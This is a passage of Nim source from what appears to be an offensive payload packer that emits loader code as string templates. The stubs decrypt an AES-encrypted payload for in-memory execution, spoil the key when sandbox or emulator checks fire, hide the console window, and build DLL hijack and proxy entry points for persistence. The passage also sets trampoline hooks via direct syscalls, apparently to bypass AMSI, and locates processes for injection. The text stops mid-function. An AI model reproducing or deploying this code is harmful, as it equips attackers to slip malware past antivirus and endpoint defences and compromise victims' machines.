                expandedkey = expandedkey[0..(aes256.sizeBlock * 2) - 1]
            when defined(verbose):
                echo "[*] New Length: " & $len(expandedkey)

        moveMemory(addr key[0], addr expandedkey[0], len(expandedkey))
        discard calcHard()
        #dectext = newSeq[byte](len(enctext))

        var ptrKey = cast[ptr byte](addr key[0])

        let dataLen = uint(len(enctext))
        when defined(verbose):
            when defined(csharp):
                echo obf("[!] Decrypting C# Assembly for execution...")
            else:
                echo obf("[!] Decrypting Payload for execution in memory...\r\n")
        discard calcHard()
        dctx.init(ptrKey)
        discard calcHard()
        dctx.decrypt(cast[ptr byte](ptrEncText), cast[ptr byte](ptrDecText), dataLen)
        discard calcHard()
        dctx.clear()

"""

let Accelerated_sleepStub * = fmt"""

proc accelerated_sleep*(): void =
    var 
        dwStart: DWORD
        dwEnd: DWORD = 0
    
    when defined(DInvoke):
        dwStart = MyGetTickCount()
    else:
        dwStart = GetTickCount()

    # Lets Sleep for two seconds
    when defined(DInvoke):
        discard MySleep(1500)
    else:
        Sleep(1500)

    when defined(DInvoke):
        dwEnd = MyGetTickCount()
    else:
        dwEnd = GetTickCount()
    var dwDiff = dwEnd - dwStart
    # If we slept for less than 2 seconds, we are in a VM
    if (dwDiff < 1300):
        quit()
    else:
        when defined(verbose):
            echo obf("[*] We don't appear to be in a sandbox according to the Sleep time")
        when not defined(AntiDebug):
            when not defined(customKey): # Key retrieved from DNS, than we don't want to change it
                envkey2 = envkey & "{lastFour}"
        else:
            when not defined(customKey):
                envkey2 = envkey2 & "{lastTwo}"
        when defined(verbose):
            echo obf("[*] Final Key: ") & envkey2
accelerated_sleep()
"""

let AntiEmulateStub * = """

#from os import fileExists
#from winim import GetFileAttributesA


proc GetFileAttributesW(path: LPCWSTR): DWORD {.importc, dynlib: "kernel32.dll".}

proc officeFileCheck(): void =
    # check if the file "C:\Program Files\Microsoft Office\AppXManifest.xml" exists
    var fileCount: int = 0
    var AppXManifest: string = obf(r"C:\Program Files\Microsoft Office\AppXManifest.xml")
    var dwAttributes: DWORD
    var wideAppXManifest: WideCString = newWideCString(AppXManifest)
    dwAttributes = GetFileAttributesW(cast[LPCWSTR](wideAppXManifest))
    if (dwAttributes != INVALID_FILE_ATTRIBUTES):
        fileCount += 1
        when defined(verbose):
            echo obf("[*] File: ") & AppXManifest & obf(" exists")
    elif(dwAttributes == 0xFFFFFFFFFFFFFFFF):
        when defined(verbose):
            echo obf("[*] File: ") & AppXManifest & obf(" does not exist")
    else:
        # check if file "C:\Program Files\Microsoft Office\RappelZapp.xml" exists
        var RappelZapp: string = obf(r"C:\Program Files\Microsoft Office\RappelZapp.xml")
        var wideRappelZapp: WideCString = newWideCString(RappelZapp)
        dwAttributes = GetFileAttributesW(cast[LPCWSTR](wideRappelZapp))
        if dwAttributes != INVALID_FILE_ATTRIBUTES:
            fileCount += 1
            when defined(verbose):
                echo obf("[*] File: ") & RappelZapp & obf(" exists")
        elif(dwAttributes == 0xFFFFFFFFFFFFFFFF):
            when defined(verbose):
                echo obf("[*] File: ") & RappelZapp & obf(" does not exist")
    
    # Now check if C:\\PROGRA~1\\WindowsApps and C:\\PROGRA~2\\WindowsApps exist
    var WindowsApps: string = obf(r"C:\PROGRA~1\WindowsApps")
    var WindowsApps2: string = obf(r"C:\PROGRA~2\WindowsApps")
    var wideWindowsApps: WideCString = newWideCString(WindowsApps)
    var wideWindowsApps2: WideCString = newWideCString(WindowsApps2)
    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](wideWindowsApps)) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](wideWindowsApps2))):
        fileCount += 1
        when defined(verbose):
            echo obf("[*] File: ") & WindowsApps & obf(" or ") & WindowsApps2 & obf(" exists")
    else:
        when defined(verbose):
            echo obf("[*] File: ") & WindowsApps & obf(" and ") & WindowsApps2 & obf(" do not exist")

    if fileCount == 3:
        when defined(verbose):
            echo obf("[*] Two many files found...")
        envkey = obf("aetschibaetsch")
        envkey2 = envkey
        when defined(verbose):
            echo obf("[*] Final Key: ") & envkey2
    else:
        when defined(verbose):
            echo obf("[*] No false answer to files being checked, continuing...")

officeFileCheck()

# the following function will perform ten billion increments on a variable
proc billionIncrements(): void =
    var a: int = 0
    for i in 0 .. 10000000000:
        a += 1
    when defined(verbose):
        echo obf("[*] Final value of a: ") & $a

billionIncrements()

proc OpenProcess(ProcessAccess: DWORD, bInheritHandle: BOOL, ProcessId: int64): HANDLE {.importc, dynlib: "kernel32.dll".}

# Open process with id of 0xFFFFFFFF1 which is more than the MAX value of a DWORD. If that succeeds, we are in an emulated environment.
proc OpenMoreMaxPIDProcess(): void =
    var hProcess: HANDLE = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 0xFFFFFFFF1)
    if hProcess != 0:
        when defined(verbose):
            echo obf("[*] OpenProcess with PID 0xFFFFFFFF1 succeeded, we are in an emulated environment")
        envkey = obf("aetschibaetsch")
        envkey2 = envkey
        when defined(verbose):
            echo obf("[*] Final Key: ") & envkey2
    else:
        when defined(verbose):
            echo obf("[*] OpenProcess with PID 0xFFFFFFFF1 failed, we are not in an emulated environment")

OpenMoreMaxPIDProcess()


"""

let AmsiNtCreateSectionDecryptStub = fmt"""

var dctx2: ECB[aes256]
var key2: array[aes256.sizeKey, byte]
discard calcHard()
#envkey2 = obf("{envkey}")

var expandedkey2 = toByteSeq(toHex(envkey2))
discard calcHard()
if ((len(expandedkey2) mod aes256.sizeBlock) != 0):
    when defined(verbose):
        echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
        echo "[*] Length: " & $len(expandedkey2)
        echo "[*] Padding Key with null bytes"
    expandedkey2 = expandedkey2 & newSeq[byte]((aes256.sizeBlock * 2) - (len(expandedkey2) mod (aes256.sizeBlock * 2)))
    # Length cannot be > 32 bytes
    if (len(expandedkey2) > (aes256.sizeBlock * 2)):
        expandedkey2 = expandedkey2[0..(aes256.sizeBlock * 2) - 1]
    when defined(verbose):
        echo "[*] New Length: " & $len(expandedkey2)

moveMemory(addr key2[0], addr expandedkey2[0], len(expandedkey2))
discard calcHard()

"""

let RemoteModuleHandleStub = """

# Credit to @whydee86 - https://github.com/whydee86/SnD_AMSI/blob/main/Remote.nim


proc ConvertToString(CharArr :array[256,char]): string =
    var index = 0
    while CharArr[index] != '\x00':
        result.add(CharArr[index])
        index += 1

proc GetRemoteModuleHandle  (hProcess:HANDLE, ModuleName: string): HMODULE =
    var 
        modEntry : MODULEENTRY32A
        snapshot : HANDLE

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
    if snapshot != INVALID_HANDLE_VALUE:
        modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
        if Module32FirstA(snapshot, addr modEntry):
            while Module32NextA(snapshot, addr modEntry):
                if toLowerAscii(ConvertToString(modEntry.szModule)) == toLowerAscii(ModuleName):
                    return modEntry.hModule
    CloseHandle(snapshot)
    return 0

proc GetRemoteProcAddress  (hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
    var
        baseModule : UINT_PTR = cast[UINT64](hModule)
        dosHeader : IMAGE_DOS_HEADER
        ntHeader : IMAGE_NT_HEADERS
        exportDirectory : IMAGE_EXPORT_DIRECTORY
        ExportTable : DWORD = 0
        ExportFunctionTableVA : UINT_PTR = 0
        ExportNameTableVA : UINT_PTR = 0
        ExportOrdinalTableVA : UINT_PTR = 0
        ExportNameTable: seq[DWORD]
        ExportFunctionTable: seq[DWORD]
        ExportOrdinalsTable: seq[WORD] 
        MinFunNumber : UINT_PTR = 0
        Func : DWORD = 0
        Ord : WORD = 0
        CharIndex : UINT_PTR = 0
        TempChar : char
        Done : bool = false
        TempFunctionName : string = ""

    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
        return NULL
    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read and check the NT signature: "), GetlastError()
        return NULL

    ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
    
    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read the main export table "), GetlastError()

    ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
    ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
    ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
        Func = 0
        Ord = 0 
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy name table "), GetlastError()
            return NULL
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy Ordinal table "), GetlastError()
            return NULL
        ExportNameTable.add(Func)
        ExportOrdinalsTable.add(Ord)
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
        Func = 0
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy fucntion table "), GetlastError()
            return NULL
        ExportFunctionTable.add(Func)
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
        CharIndex = 0
        Done = false
        TempFunctionName = ""
        while Done == false:
            if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
                when defined(verbose):
                    echo obf("Failed to read the names of the functions"), GetlastError()
                return NULL
            if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
                Done = true
            else:
                TempFunctionName.add(TempChar)
            CharIndex += 1
        if toLowerAscii(TempFunctionName) == toLowerAscii(FuncName):
            return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
    when defined(verbose):
        echo obf("[X] Proc name does not exits")
    return NULL

"""


proc genEnglishwords (nuofWords: int): string =

  proc pumpenglishwords (numberofWords: int): seq[string] =

    var englishdicts: seq[string]
    var output: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = fmt"{packerPath}\\Dicts\\englishwords.txt"
    else:
        dictionary = fmt"{packerPath}/Dicts/englishwords.txt"
    for line in lines dictionary:
      englishdicts.add(line)
    for i in 1 .. numberofWords:
      output.add(sample(englishdicts))
    return output

  proc rndStr: string =
    for _ in 0.. 10:
      add(result, char(rand(int('a') .. int('z'))))
    
  var rand1: seq[string] = pumpenglishwords(nuofWords)
  var rand2: string = rndStr()

  let englishwordsstub = fmt"""

var {rand2} = {rand1}

"""
  return englishwordsstub


proc genTrustedwords (nuofWords: int): string =

  proc pumpTrustedwords (numberofWords: int): seq[string] =

    var trusteddicts: seq[string]
    var output: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = fmt"{packerPath}\\Dicts\\trustedStrings.txt"
    else:
        dictionary = fmt"{packerPath}/Dicts/trustedStrings.txt"
    for line in lines dictionary:
      trusteddicts.add(line)
    for i in 1 .. numberofWords:
      output.add(sample(trusteddicts))
    return output
    
  var rand1: seq[string] = pumpTrustedwords(nuofWords)
  var rand2: string = rndStr()

  let trustedwordsstub = fmt"""

var {rand2} = {rand1}

"""

  return trustedwordsstub

let DLLNoHideStub = """

   

"""

let DllStub = """
import dynlib
proc NimMain() {.cdecl, importc.}

when not defined(dllexportfuncs):
    when defined(notcloned) :
        proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
            NimMain()
            return true

        proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
            NimMain()
            return true

        proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
            NimMain()
            return true
"""

let ExecuteInStub = """

proc execute_in(): bool =
    var temp: array[MAX_PATH, char]
    var exe_name: string = obf("EXENAME")
    if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
        let temp_str = $cast[cstring](temp.addr)
        if temp_str.toLower().contains(exe_name.toLower()):
            return false
    return true


"""


let PerfectDLLHijackStub = """

import perfecthijack

proc mainWrapper(lpParam: LPVOID): DWORD {.stdcall.} =
  result = main(lpParam)
  # main returned: remote handoff complete (or demon exited in localexec) -> hard kill
  let ntp = cast[proc (h: HANDLE, s: NTSTATUS): NTSTATUS {.stdcall.}](
    GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTerminateProcess"))
  if ntp != nil:
    discard ntp(GetCurrentProcess(), 0)
  discard TerminateProcess(GetCurrentProcess(), 0)

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  # only run once, on process attach (original ran on every THREAD_ATTACH too)
  if fdwReason != DLL_PROCESS_ATTACH:
    return true

  # we hardcode this C Code in front of NimMain, because NimMain will LoaderLock some processes that we don't want to target
  # this is especially needed/usefull for COM Hijacking persistence.
  when defined(execute_in_proc):
    {.emit: @@@
        #include <string.h>
        #include <ctype.h>

        char temp[MAX_PATH];
        const char* exe_name = "EXENAME";

        // Case-insensitive strstr implementation
        const char* strcasestr(const char* haystack, const char* needle) {
            if (!*needle) return haystack;
            for (; *haystack; ++haystack) {
                if (tolower((unsigned char)*haystack) == tolower((unsigned char)*needle)) {
                    const char* h = haystack, *n = needle;
                    for (; *h && *n; ++h, ++n) {
                        if (tolower((unsigned char)*h) != tolower((unsigned char)*n)) break;
                    }
                    if (!*n) return haystack;
                }
            }
            return NULL;
        }

        if (GetModuleFileNameA((HMODULE)0, (LPSTR)temp, (DWORD)(sizeof(temp) / sizeof(temp[0]))) > 0) {
            const char* temp_str = temp;
            if (strcasestr(temp_str, exe_name) == NULL) {
                return 0; // return true and exit DllMain
            }
        }
    @@@.}
  when not defined(payloadFunc):
    NimMain()

  if lpvReserved == nil:
    # ---- dynamic load (LoadLibrary): rundll32, custom loader, COM hijack ----
    # post-init context -> original trap is safe:
    # unlock loader lock -> run/wait on main -> never return
    # => LoadLibrary never returns => no export check, no dialog, no exit
    var ntdll: HMODULE = GetModuleHandleA("ntdll.dll")
    var LdrUnlockLoaderLock: FARPROC = GetProcAddress(ntdll, "LdrUnlockLoaderLock")
    var RtlExitUserProcess: FARPROC = GetProcAddress(ntdll, "RtlExitUserProcess")
    LdrFullUnlock(main, LdrUnlockLoaderLock, RtlExitUserProcess)
    # never returns
  else:
    # ---- static load (import-table): init-time sideload, e.g. AppInstaller ----
    # init may still be running -> CreateThread + return; worker auto-starts post-init
    when not defined(payloadFunc):
      when defined(mutexoneshot):
        var temp: array[MAX_PATH, char]
        if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
          let mutexName = &"Global\\REPLACEMUTEX"
          let mutex = CreateMutexA(nil, TRUE, mutexName)
          if mutex != 0 and GetLastError() != ERROR_ALREADY_EXISTS:
            var tid: DWORD
            discard CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](mainWrapper), nil, 0, addr tid)
      else:
        var tid: DWORD
        discard CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](mainWrapper), nil, 0, addr tid)

  return true
"""


let DLLHijackStub = """

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  when defined(execute_in_proc):
    {.emit: @@@
    #include <string.h>
        #include <ctype.h>

        char temp[MAX_PATH];
        const char* exe_name = "EXENAME";

        // Case-insensitive strstr implementation
        const char* strcasestr(const char* haystack, const char* needle) {
            if (!*needle) return haystack;
            for (; *haystack; ++haystack) {
                if (tolower((unsigned char)*haystack) == tolower((unsigned char)*needle)) {
                    const char* h = haystack, *n = needle;
                    for (; *h && *n; ++h, ++n) {
                        if (tolower((unsigned char)*h) != tolower((unsigned char)*n)) break;
                    }
                    if (!*n) return haystack;
                }
            }
            return NULL;
        }

        if (GetModuleFileNameA((HMODULE)0, (LPSTR)temp, (DWORD)(sizeof(temp) / sizeof(temp[0]))) > 0) {
            const char* temp_str = temp;
            if (strcasestr(temp_str, exe_name) == NULL) {
                return 0; // return true and exit DllMain
            }
        }
    @@@.}
  when not defined(dllexportfuncs):
    when not defined(payloadFunc):
      NimMain()
  
  if fdwReason == DLL_PROCESS_ATTACH:
    NimMain()
    when defined(cloned):
        when not defined(payloadFunc):
            when defined(mutexoneshot):
                var temp: array[MAX_PATH, char]
                if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
                    let mutexName = &"Global\\REPLACEMUTEX"
                    var lastError: DWORD
                    let mutex = CreateMutexA(nil, TRUE, mutexName)
                    lastError = GetLastError()
                    if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
                        var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
            else:
                var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
  if fdwReason == DLL_THREAD_ATTACH:
    NimMain()
  #if fdwReason == DLL_PROCESS_ATTACH:
  #  NimMain()
  return true

"""

let DLLProxyStub = """

import dynlib
proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  when defined(execute_in_proc):
    {.emit: @@@
    #include <string.h>
        #include <ctype.h>

        char temp[MAX_PATH];
        const char* exe_name = "EXENAME";

        // Case-insensitive strstr implementation
        const char* strcasestr(const char* haystack, const char* needle) {
            if (!*needle) return haystack;
            for (; *haystack; ++haystack) {
                if (tolower((unsigned char)*haystack) == tolower((unsigned char)*needle)) {
                    const char* h = haystack, *n = needle;
                    for (; *h && *n; ++h, ++n) {
                        if (tolower((unsigned char)*h) != tolower((unsigned char)*n)) break;
                    }
                    if (!*n) return haystack;
                }
            }
            return NULL;
        }

        if (GetModuleFileNameA((HMODULE)0, (LPSTR)temp, (DWORD)(sizeof(temp) / sizeof(temp[0]))) > 0) {
            const char* temp_str = temp;
            if (strcasestr(temp_str, exe_name) == NULL) {
                return 0; // return true and exit DllMain
            }
        }
    @@@.}
  when not defined(payloadFunc):
    NimMain()
  
  when not defined(payloadFunc):
    if fdwReason == DLL_PROCESS_ATTACH:
        when defined(mutexoneshot):
            var temp: array[MAX_PATH, char]
            if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
                let mutexName = &"Global\\REPLACEMUTEX"
                var lastError: DWORD
                let mutex = CreateMutexA(nil, TRUE, mutexName)
                lastError = GetLastError()
                if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
                    var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
        else:
            var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
            CloseHandle(threadHandle)
  #if fdwReason == DLL_THREAD_ATTACH:
  #  NimMain()
  #if fdwReason == DLL_PROCESS_ATTACH:
  #  NimMain()
  return true

"""

let DllCustomPayloadFuncStub = """

type
    functionType = proc (arg1: uint64, arg2: uint64, arg3: uint64, arg4: uint64, arg5: uint64, arg6: uint64, arg7: uint64, arg8: uint64, arg9: uint64, arg10: uint64, arg11: uint64, arg12: uint64): uint64 {.stdcall.}

proc {payloadFunction}Fwd(arg1: uint64, arg2: uint64, arg3: uint64, arg4: uint64, arg5: uint64, arg6: uint64, arg7: uint64, arg8: uint64, arg9: uint64, arg10: uint64, arg11: uint64, arg12: uint64): uint64 {.stdcall,exportc, dynlib.} =
    NimMain()
    var return_value: uint64 = 0
    when defined(mutexoneshot):
        var temp: array[MAX_PATH, char]
        if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
            let mutexName = &"Global\\REPLACEMUTEX"
            var lastError: DWORD
            let mutex = CreateMutexA(nil, TRUE, mutexName)
            lastError = GetLastError()
            if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
                var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
                WaitForSingleObject(threadHandle, INFINITE)
    else:
        var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
        WaitForSingleObject(threadHandle, INFINITE)
    # LoadLibraryA for PAYLOADDLL
    var payloadDLL = LoadLibraryA("PAYLOADDLL")
    # GetProcAddress for `{payloadFunction}`
    var payloadFunction = GetProcAddress(payloadDLL, "{payloadFunction}")
    # cast as 12 uint64 arguments and uint64 output
    var payloadFunctionPtr = cast[functionType](payloadFunction)
    # call the function
    return_value = payloadFunctionPtr(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12)
    return return_value
"""


let DllCustomExportStub = """
proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
    NimMain()
    when defined(xll):
        # Create a Thread on the main function
        when defined(mutexoneshot):
            var temp: array[MAX_PATH, char]
            if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
                let mutexName = &"Global\\REPLACEMUTEX"
                var lastError: DWORD
                let mutex = CreateMutexA(nil, TRUE, mutexName)
                lastError = GetLastError()
                if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
                    var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
        else:
            var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
        # when defined remoteinject CloseHandle
        when defined(remoteinject):
            CloseHandle(threadHandle)
        else:
            # Wait for the thread to finish
            WaitForSingleObject(threadHandle, INFINITE)

    
    return true
"""

let APIHideStub = """

#[ Crappy behaviours here , maybe I'll fix it later ]
when defined(DInvoke):
    const
      USER32_DLL* = obf("user32.dll")

    type
      GetConsoleWindow_t* = proc (): HANDLE {.stdcall.}
      ShowWindow_t* = proc (hwnd: HANDLE, nCmdShow: int): BOOL {.stdcall.}
  
    const
      GetConsoleWindow_OBF * = obf("GetConsoleWindow")
      ShowWindow_OBF * = obf("ShowWindow")
  
    var MyGetConsoleWindow*: GetConsoleWindow_t
    var MyShowWindow*: ShowWindow_t

    MyGetConsoleWindow = cast[GetConsoleWindow_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetConsoleWindow_OBF, 0, FALSE)))

    MyShowWindow = cast[ShowWindow_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(USER32_DLL, TRUE)), ShowWindow_OBF, 0, FALSE)))


    var hwnd: HANDLE = MyGetConsoleWindow()
    var hidden: bool = MyShowWindow(hwnd, SW_HIDE)
    when defined(verbose):
        echo "Hidden:", hidden

else:]#
var hwnd: HANDLE
hwnd = GetConsoleWindow()
ShowWindow(hwnd, SW_HIDE)
"""

let SleepyCryptLoopExecute = """
SleepyCryptLoop(10000)
"""

let NotepadProcIDStub * = fmt"""

    when defined(ruylopez):

        var ntdlldll = LoadLibraryA(obf("ntdll.dll"))
        if (ntdlldll == 0):
            echo obf("[X] Failed to load ntdll.dll")


        var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,obf("NtFlushInstructionCache"))
        if isNil(NtFlushInstructionCacheAddress):
            echo obf("[X] Failed to get the address of 'NtFlushInstructionCache'")


        var NtFlushInstructionCache: MyNtFlushInstructionCache
        NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCacheAddress)


        proc fastTrampoline(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers = nil): bool

        var g_hookedNtCreate: HookedNtCreate

        var ntCreate_Address: HANDLE

        var NtCreateSection: typeNtCreateSection

        proc fastTrampoline(targetProc: HANDLE, addressToHook: LPVOID, jumpAddress: LPVOID, buffers: ptr HookTrampolineBuffers): bool =
            var trampoline: seq[byte]
            if defined(amd64):
                trampoline = @[
                    byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
                    byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
                ]
                var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
                copyMem(&trampoline[2] , &tempjumpaddr, 6)
            elif defined(i386):
                trampoline = @[
                    byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
                    byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
                ]
                var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
                copyMem(&trampoline[1] , &tempjumpaddr, 3)
            
            var dwSize: SIZE_T = cast[SIZE_T](len(trampoline))
            var protectionLength: SIZE_T = cast[SIZE_T](len(trampoline))
            var dwordSize: DWORD = DWORD(len(trampoline))
            var dwOldProtect: DWORD = 0
            var output: bool = false
            var status: NTSTATUS = 0
            var szWritten: SIZE_T = 0
            


            if (buffers != nil):
                if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
                    return false
                copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
            
            var protectAddress: LPVOID = addressToHook
            
            when defined(Syswhispers):
                status = uashdiasdj(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_READWRITE,addr dwOldProtect)
            else:
                when defined(Hellsgate):
                    if getSyscall(ntProtectTable):                
                        syscall = ntProtectTable.wSysCall
                    else:
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

                status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_READWRITE,addr dwOldProtect)

            if (status == STATUS_SUCCESS):
                when defined(verbose):
                    echo obf("[+] NtProtectVirtualMemory RW permissions set for the hook")
                
                when defined(Syswhispers):
                    status = oqiazasusjk(targetProc,addressToHook,addr trampoline[0],dwordSize,addr szWritten)
                else:
                    when defined(Hellsgate):
                        if getSyscall(ntWriteTable):
                            syscall = ntWriteTable.wSysCall
                        else:
                            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

                    status = NtWriteVirtualMemory(targetProc,addressToHook,addr trampoline[0],dwordSize,addr szWritten)
                if (status == 0):
                    echo obf("[+] NtWriteVirtualMemory - hook set.")
                    output = true
                else:
                    echo obf("[-] NtWriteVirtualMemory failed: "), toHex(status)
                    output = false
            else:
                echo obf("[-] NtProtectVirtualMemory for the hook failed: "), toHex(status)
                output = false
            
            protectAddress = addressToHook
            when defined(Syswhispers):
                status = uashdiasdj(targetProc,unsafeAddr protectAddress,addr protectionLength,PAGE_EXECUTE_READ,addr dwOldProtect)
            else:
                when defined(Hellsgate):
                    if getSyscall(ntProtectTable):
                        syscall = ntProtectTable.wSysCall
                    else:
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

                status = NtProtectVirtualMemory(targetProc,unsafeAddr protectAddress,addr dwSize,PAGE_EXECUTE_READ,addr dwOldProtect)
            
            if(status != STATUS_SUCCESS):
                echo obf("[-] NtProtectVirtualMemory to restore page permissions failed")
            else:
                echo obf("[+] NtProtectVirtualMemory succeeded, page permissions (RX) restored")
            
            
            status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwordSize)
            if (status == 0):
                echo obf("[+] NtFlushInstructionCache success")
            else:
                echo obf("[-] NtFlushInstructionCache failed: "), toHex(status)
            
            return output

    when defined(ruylopez):
        proc checkIfInteger(input: string): bool =
            try:
                discard parseInt(input)
                return true
            except:
                return false


        proc amISpawned(): bool =
            when defined(lib_only):
                if(paramCount() >= 2):
                    if(checkIfInteger(paramStr(2))):
                        return true
                    else:
                        return false
            else:
                # if one or more arguments provided return
                if (paramCount() >= 1):
                    if(checkIfInteger(paramStr(1))):
                        return true
                    else:
                        when defined(verbose):
                            echo obf("[*] No input parameters, spawning process...")
                        return false
            return false

    proc FindPidByName (processName : string):DWORD =
        try:
            var 
                entry : PROCESSENTRY32A
                snapshot : HANDLE
                pid : DWORD = 0
            snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if snapshot != INVALID_HANDLE_VALUE:
                entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
                if Process32FirstA(snapshot,addr entry):
                    while Process32NextA(snapshot,addr entry):
                        pid = entry.th32ProcessID
                        if ($(entry.szExeFile).join()).contains(processName):
                            result = pid
        except: 
            echo obf("Process ID not found")

    var remoteProcID: DWORD
    
    # We will re-Use this Handle to avoid using NtOpenProcess again later and it's corresponding Kernel Callback
    var tProcess: HANDLE
    var treadHandle: HANDLE
    
    proc StartProcess(): void =
        var 
            lpSize: SIZE_T
            pi: PROCESS_INFORMATION
            ps: SECURITY_ATTRIBUTES
            si: STARTUPINFOEX
            status: WINBOOL
            tProcPath: WideCString
            ts: SECURITY_ATTRIBUTES
        
        ps.nLength = sizeof(ps).cint
        ts.nLength = sizeof(ts).cint
        si.StartupInfo.cb = sizeof(si).cint

        
        when defined(localinject):
            proc getParentProcessId(): int =
                var hwnd = GetForegroundWindow()
                var processId: DWORD = 0
